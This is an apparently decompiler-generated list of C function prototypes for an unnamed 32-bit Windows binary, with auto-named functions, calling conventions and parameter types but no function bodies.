int __thiscall sub_434AF0(_DWORD *this, int a2, int a3, int a4, unsigned int a5, int a6, int a7);
void __thiscall sub_434D90(_DWORD *this, int a2, int a3, unsigned int a4, int a5, int a6);
int __thiscall sub_435080(_DWORD *this, _DWORD *a2, void *a3, size_t a4);
void __thiscall sub_435210(_DWORD *this, _DWORD *a2, int a3, int a4);
unsigned int __thiscall sub_4353B0(_DWORD *this);
void __cdecl sub_435450(int a1, int a2, int a3, int a4, int a5, int a6, int a7, char a8, unsigned int a9);
unsigned int __thiscall sub_4355D0(_DWORD *this);
int __thiscall sub_435670(_DWORD *this, int a2, int a3, int a4);
int __thiscall sub_435750(_DWORD *this, void *a2, unsigned __int8 *a3, int a4, int a5);
int __thiscall sub_435960(_DWORD *this, int a2);
bool __thiscall sub_435A20(int *this, int a2, int a3, int a4, int a5, int a6, int a7);
char __stdcall sub_435AF0(int a1, int a2, int a3);
int __cdecl sub_435B30(int a1, unsigned int a2, unsigned int a3);
void *__thiscall sub_435E90(void *this, char a2);
char *__thiscall sub_435F70(char *this, int a2);
char *__thiscall sub_436000(char *this, _DWORD *a2);
char *__thiscall sub_436070(char *this, int a2);
char *__thiscall sub_436100(char *this, size_t *a2, unsigned int a3);
char *__thiscall sub_436340(char *this, int a2);
char *__thiscall sub_4363D0(char *this, size_t *a2);
char *__thiscall sub_4364F0(char *this, int a2);
char *__thiscall sub_436580(char *this, _DWORD *a2);
char *__thiscall sub_43661B(char *this, char a2);
void *__thiscall sub_436660(void *this, char a2);
int __thiscall sub_436680(int this, char a2);
int __thiscall sub_436710(int this, char a2);
unsigned int __thiscall sub_4367A0(void *this, unsigned int a2, unsigned int a3, unsigned int a4, unsigned int a5, char a6);
int __stdcall sub_4368B0(int a1);
int __stdcall sub_4368D0(int a1);
char __thiscall sub_4368F0(int *this);
char __thiscall sub_436920(int *this);
int __thiscall sub_436960(void *this, int a2);
int __thiscall sub_4369B0(int *this, int a2, int a3);
int __thiscall sub_436A30(int *this, int a2, int a3, int a4, int a5);
int __thiscall sub_436AC0(int *this, int a2, int a3, int a4);
int __thiscall sub_436B40(int *this, int a2, int a3, int a4, int a5, int a6);
int __thiscall sub_436BD0(int *this, int a2, int a3, int a4, int a5, int a6);
int __thiscall sub_436C00(void *this, int a2, int a3, int a4);
_DWORD *__thiscall sub_436C40(void *this, int a2, int a3, int a4);
_DWORD *__thiscall sub_436D10(void *this, int a2, int a3, int a4);
int __thiscall sub_436DE0(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7, unsigned int a8, int a9, unsigned int a10);
int __thiscall sub_436E50(int *this, int a2);
int __thiscall sub_436E80(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7, unsigned int a8, int a9, unsigned int a10);
int __thiscall sub_436EF0(void *this, int a2, int a3, int a4);
int __thiscall sub_436F10(void *this);
void __cdecl __noreturn sub_436F20(int a1, int a2);
int __thiscall sub_436F80(int *this, int a2, int a3);
char __fastcall sub_437000(int a1);
// char __userpurge sub_437020@<al>(int a1@<ecx>, int a2@<ebp>, int a3, int a4, __int64 a5);
int __thiscall sub_437150(void *this, int a2, unsigned int a3);
int __thiscall sub_4371D0(int *this, int a2);
int __thiscall sub_437200(int *this, int a2, int a3);
int __thiscall sub_4372C0(void *this, int *a2, int *a3);
int __thiscall sub_437470(_DWORD *this);
int __thiscall sub_437490(void *this, int *a2, int a3);
int __thiscall sub_4374B0(void *this);
int __thiscall sub_4374E0(_DWORD *this, int a2, int a3);
int __thiscall sub_437500(void *this, unsigned __int16 *a2, int a3);
int __thiscall sub_437570(void *this, int a2, int a3);
void __noreturn sub_437580(); // weak
int __thiscall sub_4375E0(int *this);
int __thiscall sub_437640(void *this, int a2, int a3);
int *sub_437650();
int __thiscall sub_4376F0(void *this);
int __thiscall sub_437750(int *this, int a2);
int __thiscall sub_437780(int *this, int a2, int a3);
int __thiscall sub_437840(int *this, _WORD *a2, int a3);
int __thiscall sub_4378A0(void *this, int a2, int a3, int a4, int a5);
int __stdcall sub_437960(int a1, int a2, int a3, int a4);
int __thiscall sub_437970(int this, int a2, int a3, int a4, int a5);
int __thiscall sub_437B60(int this, int a2, int a3, int a4, int a5);
int __thiscall sub_437D00(_DWORD *this, unsigned int a2, int a3, int a4);
int __thiscall sub_437D30(void *this, int a2, int a3, void (__thiscall ***a4)(_DWORD, int));
int __thiscall sub_437D90(void *this, int a2, int a3, int a4, int a5, int a6, int a7);
int __thiscall sub_437E10(int *this, int a2, unsigned int a3, int a4);
void __thiscall sub_437EB0(int *this, int a2, int a3, int a4, int a5);
int __thiscall sub_437F80(void *this, int a2);
int __thiscall sub_437FB0(void *this, int a2, void (__thiscall ***a3)(_DWORD, int), int a4);
int __thiscall sub_438020(void *this, int a2, int a3, int a4, int a5);
int __thiscall sub_4380A0(void *this, int a2, int a3, int a4, int a5, int a6, int a7);
int __thiscall sub_438130(void *this, int a2, int a3);
int __thiscall sub_4381A0(void *this);
int __thiscall sub_4381F0(void *this, int a2);
int __thiscall sub_438240(void *this, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 a4);
void ***sub_438580();
void __thiscall sub_438610(void *this, int a2);
int __thiscall sub_4386B0(int *this, unsigned int a2);
unsigned int __thiscall sub_4388B0(int *this, unsigned int a2);
int __thiscall sub_4389B0(int *this);
int __thiscall sub_4389E0(void *this, int a2, int a3, int a4);
int __thiscall sub_438B60(void *this, int a2, unsigned int *a3, int a4, int a5);
bool __thiscall sub_438C60(int *this, __m128i *a2, unsigned int a3);
char __thiscall sub_438DD0(void *this, void (__thiscall ***a2)(_DWORD, int));
char __thiscall sub_438E30(void *this, int a2, int a3, int a4, int a5);
void __thiscall sub_438EB0(_DWORD *this, size_t a2);
int __cdecl sub_438F30(void *a1, size_t a2, void *Src, size_t Size);
int __thiscall sub_438FD0(int this, int a2, _BYTE *a3);
_DWORD *__cdecl sub_439090(_DWORD *a1, int a2, _DWORD *a3, char a4);
const char **__thiscall sub_439180(const char **this, char a2);
_DWORD *__thiscall sub_4391A0(_DWORD *this, char a2);
char __thiscall sub_4391D0(unsigned int *this, void *a2, int a3, _DWORD *a4);
char __thiscall sub_439230(unsigned int *this, void *a2, int a3, unsigned int *a4);
void *sub_439290();
void __thiscall sub_4392A0(_DWORD *this, int a2);
void __thiscall sub_439360(_DWORD *this, int a2);
char __thiscall sub_439570(int this, int a2);
int __thiscall sub_439610(int this, int a2);
_DWORD *__thiscall sub_4396B0(void *this, _DWORD *a2, int a3, int a4, int a5, unsigned int a6, unsigned int a7, void *a8, int a9);
unsigned int __cdecl sub_4397E0(_DWORD *a1, unsigned int *a2);
unsigned int __thiscall sub_439890(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_4399D0(int this, unsigned int a2, _DWORD *a3);
int __cdecl sub_439B40(int a1, int a2, int a3);
int __fastcall sub_439BD0(int a1, int a2, int a3);
_DWORD *__thiscall sub_439C40(_DWORD *this, _DWORD *a2);
void __thiscall sub_439DC0(_DWORD *this);
void __thiscall sub_439E50(_DWORD *this);
void __thiscall sub_439F00(_DWORD *this);
void __thiscall sub_439FE0(int this);
void __thiscall sub_43A090(int this);
void __thiscall sub_43A1D0(_DWORD *this);
void __thiscall sub_43A280(_DWORD *this);
_DWORD *__cdecl sub_43A320(_DWORD *a1, int a2, int a3);
int __thiscall sub_43A450(int this, char a2);
int __thiscall sub_43A4F0(int this, char a2);
char *__thiscall sub_43A560(char *this, char a2);
_DWORD *__thiscall sub_43A600(_DWORD *this, char a2);
_DWORD *__thiscall sub_43A620(_DWORD *this, char a2);
int __thiscall sub_43A640(int this, char a2);
void *__thiscall sub_43A700(void *this, char a2);
int __thiscall sub_43A720(int this, char a2);
char *__thiscall sub_43A790(char *this);
int __thiscall sub_43A7A0(void *this);
_DWORD *__thiscall sub_43A7C0(_DWORD **this, _DWORD *a2, int a3);
int __thiscall sub_43A7E0(_DWORD **this);
int __stdcall sub_43A7F0(int a1);
void __thiscall __noreturn sub_43A820(_DWORD); // weak
char __thiscall sub_43A880(unsigned int *this, void *a2, int a3, _DWORD *a4);
_DWORD *__thiscall sub_43A8E0(void *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6);
_DWORD *__thiscall sub_43A910(int *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6);
int __thiscall sub_43AE60(_DWORD **this, int a2, int a3, int a4, int a5, int a6);
_DWORD *__thiscall sub_43AE90(void *this);
_DWORD *__thiscall sub_43AEE0(_DWORD *this);
_DWORD *__thiscall sub_43AF80(_DWORD *this);
_DWORD *__thiscall sub_43AFF0(_DWORD *this, _DWORD *a2, _DWORD *a3);
_DWORD *__thiscall sub_43B010(_DWORD *this, _DWORD *a2, _DWORD *a3);
_DWORD *__stdcall sub_43B110(_DWORD *a1, _DWORD *a2);
void __noreturn sub_43B130(); // weak
int __thiscall sub_43B190(int *this, int a2, int a3);
int __thiscall sub_43B1B0(void *this, int a2);
int __thiscall sub_43B1C0(_DWORD **this);
bool __stdcall sub_43B1D0(_DWORD *a1, int a2);
int __thiscall sub_43B1F0(_DWORD **this);
_DWORD *__thiscall sub_43B200(void *this, _DWORD *a2, int a3, int a4);
_DWORD *__thiscall sub_43B280(_DWORD *this, _DWORD *a2, _DWORD *a3);
unsigned int __thiscall sub_43B3C0(_DWORD *this, unsigned int a2, size_t Size);
int __thiscall sub_43B4B0(void *this);
__m128i *__thiscall sub_43B4D0(__int128 **this, unsigned int *a2);
int __thiscall sub_43B500(_DWORD **this);
_OWORD *__thiscall sub_43B510(_OWORD **this);
int __thiscall sub_43B520(_DWORD **this);
char __stdcall sub_43B530(int a1);
int __stdcall sub_43B5D0(int a1, int a2, int a3);
int __thiscall sub_43B5E0(void *this, int a2);
_DWORD *__thiscall sub_43B5F0(int this, int a2);
_DWORD *__thiscall sub_43B6A0(_DWORD *this);
_DWORD *__thiscall sub_43B780(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_43B820(_DWORD *this, _DWORD *a2, int a3);
void __thiscall sub_43B900(_DWORD *this, int a2);
char __thiscall sub_43B970(_DWORD *this, unsigned int a2, unsigned int a3, unsigned int a4);
int __thiscall sub_43BB60(void *this, int a2, int a3, int a4, int a5, int a6, int a7);
_DWORD *__thiscall sub_43BB70(_DWORD **this, _DWORD *a2, int a3);
int __thiscall sub_43BB90(void *this);
int __thiscall sub_43BBA0(int *this, int a2, unsigned int a3);
_DWORD *__thiscall sub_43BC00(void *this, _DWORD *a2, int a3, int a4);
int __thiscall sub_43BC80(_DWORD **this, int a2, int a3, int a4);
int __thiscall sub_43BCA0(_DWORD *this, unsigned __int64 a2);
void __thiscall sub_43BD20(void *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, unsigned int a5);
void __thiscall sub_43BD40(void *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, unsigned int a5);
int __thiscall sub_43C450(_DWORD **this);
_DWORD *__thiscall sub_43C460(_DWORD *this, _DWORD *a2);
int __thiscall sub_43C540(_DWORD *this);
int __thiscall sub_43C550(_DWORD **this);
void __noreturn sub_43C560(); // weak
int __thiscall sub_43C5C0(_DWORD *this, int a2, int a3, int *a4);
char __thiscall sub_43C680(_BYTE *this, int a2, int a3);
int __thiscall sub_43C6C0(_DWORD *this, int a2, int a3, int a4);
char *__thiscall sub_43C740(char **this, char *a2, int a3, int a4);
void __stdcall sub_43C7D0(_DWORD *a1, _DWORD *a2);
int __stdcall sub_43C800(int (__thiscall ***a1)(_DWORD, _DWORD), int (__thiscall ***a2)(_DWORD, _DWORD));
int __thiscall sub_43C830(_DWORD *this, unsigned int a2);
void __thiscall sub_43C8D0(_DWORD *this);
void __thiscall sub_43C960(_DWORD *this);
int __stdcall sub_43C9F0(_DWORD *a1, _DWORD *a2, int a3);
_DWORD *__stdcall sub_43CAB0(_DWORD *a1, _DWORD *a2, int a3);
void *__stdcall sub_43CB70(unsigned int a1, int a2);
_DWORD *__stdcall sub_43CBA0(unsigned int a1);
_DWORD *__stdcall sub_43CC00(unsigned int a1);
void __stdcall sub_43CC60(void *a1, int a2);
void __stdcall sub_43CCA0(void *a1, int a2);
_DWORD *__cdecl sub_43CCE0(_DWORD *a1);
void *__stdcall sub_43CD80(void *Block, unsigned int a2, unsigned int a3, char a4);
BOOL __fastcall sub_43CE60(int a1, int a2, int a3, int a4);
BOOL __fastcall sub_43CED0(int a1, int a2, int a3, int a4);
int __cdecl sub_43CF40(_DWORD *a1, unsigned __int64 a2);
int __cdecl sub_43D030(int a1, unsigned __int64 a2, unsigned int a3);
char *__thiscall sub_43D200(char *this, int a2);
char *__thiscall sub_43D290(char *this);
_DWORD *__thiscall sub_43D360(_DWORD *this, int a2, unsigned int a3);
_DWORD *__thiscall sub_43D420(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_43D500(_DWORD *this, unsigned int a2);
_DWORD *__thiscall sub_43D570(_DWORD *this, int a2, int a3, int a4, int a5);
_DWORD *__thiscall sub_43D6C0(_DWORD *this);
void *__thiscall sub_43D720(void *this, _DWORD *a2);
char *__thiscall sub_43D840(char *this, int a2);
char *__thiscall sub_43D8D0(char *this);
_DWORD *__thiscall sub_43D9A0(_DWORD *this, int a2, int a3);
void __thiscall sub_43DA90(int this);
void __thiscall sub_43DB10(_DWORD *this);
_DWORD *__thiscall sub_43DBB0(_DWORD *this, _DWORD *a2);
_DWORD *__stdcall sub_43DC30(_DWORD *a1, unsigned int a2);
char __thiscall sub_43DCE0(_DWORD *this);
bool __cdecl sub_43DD20(_DWORD *a1, int a2);
_DWORD *__cdecl sub_43DD70(_DWORD *a1, int a2, int a3);
_DWORD *__thiscall sub_43DE00(_DWORD *this);
_DWORD *__thiscall sub_43DEB0(_DWORD *this);
_DWORD *__cdecl sub_43DF90(_DWORD *a1, int a2, int a3);
_DWORD *__thiscall sub_43E040(_DWORD *this, _DWORD *a2);
_DWORD *__cdecl sub_43E090(_DWORD *a1, _DWORD *a2, _DWORD *a3);
unsigned int __cdecl sub_43E190(_DWORD *a1, int a2);
bool __cdecl sub_43E1E0(_DWORD *a1, int a2);
bool __cdecl sub_43E230(_DWORD *a1, int a2);
_DWORD *__thiscall sub_43E280(_DWORD *this, int a2);
int __thiscall sub_43E3C0(int this, int a2);
int __thiscall sub_43E460(int this, int a2);
_DWORD *__thiscall sub_43E500(_DWORD *this, unsigned int a2);
int __thiscall sub_43E590(int this, unsigned int a2);
_DWORD *__thiscall sub_43E6D0(_DWORD *this, char a2);
int __thiscall sub_43E6F0(int this, char a2);
int __thiscall sub_43E770(int this, char a2);
int __stdcall sub_43E7E0(int a1, int a2);
_DWORD *__thiscall sub_43E7F0(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_43E890(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_43E930(_DWORD *this, _DWORD *Block, int a3);
int __cdecl sub_43EA70(_DWORD *a1, _DWORD *a2, char *a3, int a4, char *a5, unsigned int a6);
char __cdecl sub_43EE60(int a1, _DWORD *a2, unsigned int *a3);
char __thiscall sub_43EF20(unsigned int *this, void *a2, int a3, unsigned int *a4);
unsigned int __cdecl sub_43EF80(_BYTE *a1, int a2, int a3, unsigned int a4, int a5, unsigned int a6);
void __thiscall sub_43F2B0(void *this, int a2);
unsigned __int64 __cdecl sub_43F360(int a1, unsigned int *a2, unsigned int *a3);
unsigned __int64 __cdecl sub_43F3C0(int a1, unsigned int *a2, unsigned int *a3);
unsigned __int64 __cdecl sub_43F530(_DWORD *a1, unsigned int *a2, unsigned int *a3);
int __cdecl sub_43FAC0(_DWORD *a1, unsigned int *a2, unsigned int *a3);
int __cdecl sub_43FAF0(_DWORD *a1, unsigned int *a2, unsigned int *a3);
int __cdecl sub_43FBA0(_DWORD *a1, unsigned int *a2, unsigned int *a3);
_QWORD *__cdecl sub_43FE50(_QWORD *a1, unsigned int *a2, unsigned int *a3);
unsigned __int64 __cdecl sub_43FEB0(_DWORD *a1, unsigned int *a2, unsigned int *a3, unsigned int a4);
unsigned __int64 __cdecl sub_440010(_DWORD *a1, unsigned int *a2, unsigned int *a3, unsigned int a4);
_DWORD *__cdecl sub_440430(_DWORD *a1, unsigned int *a2);
_DWORD *__cdecl sub_4404A0(_DWORD *a1, unsigned int *a2);
_DWORD *__cdecl sub_440650(_DWORD *a1, unsigned int *a2);
unsigned int __thiscall sub_440BD0(_DWORD *this);
int __thiscall sub_440C10(_DWORD *this);
_DWORD *__thiscall sub_440C80(int this, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6);
void *__thiscall sub_440E30(int this, unsigned int a2);
void __thiscall sub_440E80(_DWORD *this, unsigned int a2);
int __cdecl sub_440EF0(int a1, int a2, int a3);
int __thiscall sub_440F30(_DWORD *this, int a2);
_DWORD *__thiscall sub_440F70(_DWORD *this, _DWORD *a2, int a3);
int __thiscall sub_440FF0(int this);
int __cdecl sub_441010(void *a1, void *a2, int a3);
void __thiscall sub_441030(_DWORD *this, int a2);
void __thiscall sub_441170(int this, int a2, unsigned int a3, int a4);
int __cdecl sub_441320(unsigned int *a1, unsigned int a2, int a3);
_DWORD *__thiscall sub_441360(_DWORD *this, _DWORD *a2, _DWORD *a3);
int __cdecl sub_441400(_DWORD *a1, int a2, _DWORD *a3, _DWORD *a4, int a5, char *a6, unsigned int a7);
int __cdecl sub_441740(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
int __cdecl sub_441840(_BYTE *a1, _BYTE *a2, int a3, int a4, int a5);
_DWORD *__thiscall sub_441920(_DWORD *this, _DWORD *a2, _DWORD *a3);
int __stdcall sub_441A20(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
_DWORD *__thiscall sub_441A40(_DWORD *this, _DWORD *a2);
void __thiscall sub_441AE0(_DWORD *this, int a2, unsigned int a3, int a4);
void __thiscall sub_441BE0(_DWORD *this, int a2, unsigned int a3, int a4);
bool __stdcall sub_441C70(_DWORD *a1, int a2);
int __cdecl sub_441CD0(int a1, int a2);
_DWORD *__cdecl sub_441D00(_DWORD *a1, int a2);
// _BYTE *__userpurge sub_441D90@<eax>(_DWORD *a1@<ecx>, int a2@<ebp>, int a3, int a4);
char __thiscall sub_441EE0(_DWORD *this, int *a2, int *a3);
char __thiscall sub_4428B0(_DWORD *this, unsigned int a2);
int *sub_4428E0();
int __cdecl sub_4428F0(unsigned int *a1, unsigned int a2, int a3);
_DWORD *__thiscall sub_442930(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_4429C0(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_442A60(_DWORD *this, _DWORD *a2, _DWORD *a3);
int __thiscall sub_442B70(_DWORD *this, unsigned int a2);
_DWORD *__thiscall sub_442CD0(int this, _DWORD *a2, int a3);
bool __thiscall sub_442FD0(_DWORD *this);
char __stdcall sub_443130(int a1);
char __thiscall sub_443170(_DWORD *this);
_DWORD *__thiscall sub_4431A0(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_443250(_DWORD *this, _DWORD *a2, _DWORD *a3);
_DWORD *__thiscall sub_4432F0(_DWORD *this, _DWORD *a2, _DWORD *a3);
int __thiscall sub_4433F0(_DWORD *this, unsigned int a2);
int __cdecl sub_4434C0(void *a1, int a2, int a3, int a4, int a5, unsigned int a6);
int __thiscall sub_443560(int this, int a2);
int *sub_443600();
_DWORD *__thiscall sub_443610(_DWORD *this, int *a2);
int __thiscall sub_4436E0(int this, int a2);
_DWORD *__thiscall sub_4437E0(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_443930(_DWORD *this, int a2, int a3);
unsigned int __cdecl sub_4439C0(int a1, int a2, int a3, int a4, int a5, unsigned int a6);
int __thiscall sub_443BC0(_DWORD *this);
int __thiscall sub_443C00(_DWORD *this, unsigned int a2);
_DWORD *__thiscall sub_443C50(_DWORD *this, _DWORD *a2, int a3);
int __cdecl sub_443D00(int a1, int a2, int a3);
int __thiscall sub_443E50(_DWORD *this, int a2);
void __cdecl sub_443EC0(int a1, _DWORD *a2, _DWORD *a3, int a4);
void __cdecl sub_444070(int a1, int a2, int a3);
int __cdecl sub_444260(int a1, int a2, int a3);
int __cdecl sub_4443D0(int a1, unsigned int a2);
void __thiscall sub_4444A0(_DWORD *this, int *a2, _DWORD *a3, int a4);
void __thiscall sub_444600(void *this, int *a2, unsigned int a3);
int __cdecl sub_4446D0(int a1, unsigned int *a2, _DWORD *a3, unsigned int a4);
unsigned int __cdecl sub_444810(int a1, int a2, int a3, int a4, unsigned int a5);
int __cdecl sub_4449F0(int a1, int a2, int a3, int a4, unsigned int a5);
unsigned int __cdecl sub_444AA0(int a1, int a2, int a3, unsigned int a4);
int __stdcall sub_444B80(int a1, int a2);
_DWORD *__thiscall sub_444B90(_DWORD *this, _DWORD *a2, int a3);
int __cdecl sub_444C00(unsigned int a1);
int __fastcall sub_444C50(int a1, int a2, int a3, int a4);
void __cdecl sub_444CF0(int a1, int a2, int a3);
int sub_444DAD();
int sub_444DEA();
int sub_444E27();
int sub_444E64();
int sub_444EA1();
int sub_444EDE();
// __m128i __usercall sub_444F1B@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
void __cdecl sub_4457B0(int a1, int a2, int a3);
int sub_445870();
int sub_4458B0();
int sub_4458ED();
int sub_44592A();
int sub_445967();
int sub_4459A4();
int sub_4459E1();
int sub_445A1E();
int sub_445A5B();
int sub_445A98();
int sub_445AD5();
int sub_445B12();
int sub_445B4F();
int sub_445B8C();
// __m128i __usercall sub_445BC9@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
void __cdecl sub_446DE0(int a1, int a2, int a3);
// __m128i __usercall sub_446E85@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
void __cdecl sub_447050(int a1, int a2, int a3);
int sub_447104();
int sub_447141();
// __m128i __usercall sub_44717E@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
int __cdecl sub_447590(int a1, int a2, int a3);
int sub_44764D();
int sub_44768A();
int sub_4476C7();
int sub_447704();
int sub_447741();
// __m128i __usercall sub_44777E@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
int __cdecl sub_447C80(int a1, int a2, int a3);
int sub_447D40();
int sub_447D7D();
int sub_447DBA();
int sub_447DF7();
int sub_447E34();
int sub_447E71();
int sub_447EAE();
int sub_447EEB();
int sub_447F28();
int sub_447F65();
int sub_447FA2();
int sub_447FDF();
int sub_44801C();
// __m128i __usercall sub_448059@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
int __cdecl sub_448AC0(int a1, int a2, int a3);
int __cdecl sub_448C20(int a1, int a2, int a3);
int sub_448CD1();
// __m128i __usercall sub_448D0E@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
void __cdecl sub_448F60(int a1, int a2, int a3);
int sub_449084();
int sub_4490C1();
int sub_4490FE();
int sub_44913B();
int sub_449178();
int sub_4491B5();
// __m128i __usercall sub_4491F2@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
void __cdecl sub_4496F0(int a1, int a2, int a3);
int sub_4498B2();
int sub_4498F2();
int sub_44992F();
int sub_44996C();
int sub_4499A9();
int sub_4499E6();
int sub_449A23();
int sub_449A60();
int sub_449A9D();
int sub_449ADA();
int sub_449B17();
int sub_449B54();
int sub_449B91();
int sub_449BCE();
// __m128i __usercall sub_449C0B@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
void __cdecl sub_44A590(int a1, int a2, int a3);
int sub_44A65F();
int sub_44A69C();
// __m128i __usercall sub_44A6D9@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
int __cdecl sub_44A990(int a1, int a2);
int sub_44AA29();
int sub_44AA66();
// __m128i __usercall sub_44AAA3@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
int __cdecl sub_44B600(int a1, int a2);
int sub_44B69C();
int sub_44B6DC();
int sub_44B719();
int sub_44B756();
int sub_44B793();
int sub_44B7D0();
// __m128i __usercall sub_44B80D@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
int __cdecl sub_44D090(int a1, int a2);
int __cdecl sub_44D2C0(int a1, int a2);
// __m128i __usercall sub_44D34A@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
int __fastcall sub_44D850(int a1, int a2, int a3, int a4);
char sub_44D8F0();
unsigned int __cdecl sub_44DA50(int a1, unsigned int a2, int a3);
int __cdecl sub_44DAA0(int a1, int a2, int a3);
int __cdecl sub_44DB00(int a1, unsigned int a2, unsigned int a3);
void __thiscall sub_44DB60(int this, _DWORD *a2, _DWORD *a3, _DWORD *a4, unsigned int a5);
_DWORD *__thiscall sub_44DD20(_DWORD *this, int a2);
_DWORD *__thiscall sub_44DE20(_DWORD *this, int a2);
_DWORD *__thiscall sub_44DEA0(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_44E2A0(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_44E340(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_44E440(_DWORD *this, _DWORD *a2, int a3);
int *sub_44E4D0();
unsigned int __cdecl sub_44E4E0(unsigned int *a1, unsigned int a2);
int __thiscall sub_44E560(_DWORD *this);
_DWORD *__cdecl sub_44E580(_DWORD *a1, int a2, int a3, _DWORD *a4);
int __thiscall sub_44E6A0(int this, int a2, __int64 a3);
int __thiscall sub_44E830(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_44E870(_DWORD *this, const char *a2, void (__thiscall *a3)(int, _DWORD *), int a4, int a5);
_DWORD *__thiscall sub_44E990(_DWORD *this, const char *a2, void (__thiscall *a3)(int, _DWORD *), int a4, int a5);
void *__thiscall sub_44EAB0(void *this, void *a2, int (__thiscall *a3)(int), int a4, int a5);
_DWORD *__thiscall sub_44EB60(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_44ED20(_DWORD *this, int a2, int a3);
void *__thiscall sub_44EEE0(void *this, int a2, char *a3, int a4, _DWORD *a5, int a6);
void *__thiscall sub_44F0D0(void *this, int a2, char *a3, int a4, _DWORD *a5, int a6);
_DWORD *__thiscall sub_44F2C0(_DWORD *this);
void __thiscall sub_44F3E0(int this);
_DWORD *__thiscall sub_44F457(_DWORD *this, char a2);
_DWORD *__thiscall sub_44F4C0(_DWORD *this, char a2);
int __thiscall sub_44F4F0(_DWORD *this);
int __thiscall sub_44F500(_DWORD *this);
int __thiscall sub_44F510(_DWORD *this);
int __stdcall sub_44F520(int a1);
int __stdcall sub_44F540(int a1);
void __thiscall __noreturn sub_44F560(_DWORD *this);
_DWORD *__thiscall sub_44F570(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_44F5B0(void *this, int a2);
_DWORD *__thiscall sub_44F700(void *this, int a2);
char __thiscall sub_44F780(unsigned int *this, void *a2, int a3, unsigned int *a4);
void __thiscall sub_44F7E0(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_44F9B0(_DWORD *this, int a2, int a3, int a4);
_DWORD *__thiscall sub_44FA50(_DWORD *this, _DWORD *a2, int *a3, int a4);
int __thiscall sub_44FDD0(void *this, unsigned int a2);
void __thiscall sub_44FDF0(_DWORD *this, int a2);
void __thiscall sub_44FF50(_DWORD *this, int a2);
int __thiscall sub_44FFF0(_DWORD *this);
int __thiscall sub_450080(int *this);
void __thiscall sub_450140(char *this, int *a2, int *a3);
_DWORD *__stdcall sub_450960(_DWORD *a1);
_DWORD *__stdcall sub_450A30(_DWORD *a1);
int sub_450A50();
_DWORD *sub_450A60();
char *__thiscall sub_450A70(char *this);
char *__thiscall sub_450A80(char *this);
char *__thiscall sub_450A90(char *this);
char *__thiscall sub_450AA0(char *this);
char *__thiscall sub_450AB0(char *this);
char *__thiscall sub_450AC0(char *this);
int __thiscall sub_450AD0(_DWORD *this);
int __thiscall sub_450AE0(_DWORD *this);
char *__thiscall sub_450AF0(char *this);
int __thiscall sub_450B00(_DWORD *this);
int __thiscall sub_450B10(_DWORD *this);
int __thiscall sub_450B20(_DWORD *this);
int __thiscall sub_450B30(_DWORD *this);
int __thiscall sub_450B40(_DWORD *this);
char __thiscall sub_450B50(void *this, char *a2, int a3, _DWORD *a4);
char __thiscall sub_450E20(void *this, char *a2, int a3, _DWORD *a4);
void __thiscall sub_450FA0(void (__thiscall ***this)(int, _DWORD, _DWORD *), int a2, _DWORD *a3, _DWORD *a4);
bool __thiscall sub_451190(void *this, _DWORD *a2);
char __thiscall sub_451280(_DWORD *this);
char __thiscall sub_4512B0(_DWORD *this);
_DWORD *__cdecl sub_4512E0(_DWORD *a1, _DWORD *a2, int a3);
int __thiscall sub_4513D0(void *this, int a2);
int __thiscall sub_4513F0(_DWORD *this);
int __thiscall sub_4514D0(_DWORD *this);
int __thiscall sub_4515B0(void *this, int a2);
int __stdcall sub_4515C0(int a1, int a2);
int __thiscall sub_4515E0(int this, int a2);
_DWORD *sub_4516F0();
int __thiscall sub_451760(_DWORD *this);
int __thiscall sub_451780(_DWORD *this);
_DWORD *__thiscall sub_451840(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_451850(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_451860(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_451870(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_451880(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_451890(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_4518A0(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_4518B0(_DWORD *this, _DWORD *a2);
int __thiscall sub_4518C0(_DWORD *this);
int __cdecl sub_451950(int a1);
char __thiscall sub_451C50(_DWORD *this, int *a2, unsigned int a3);
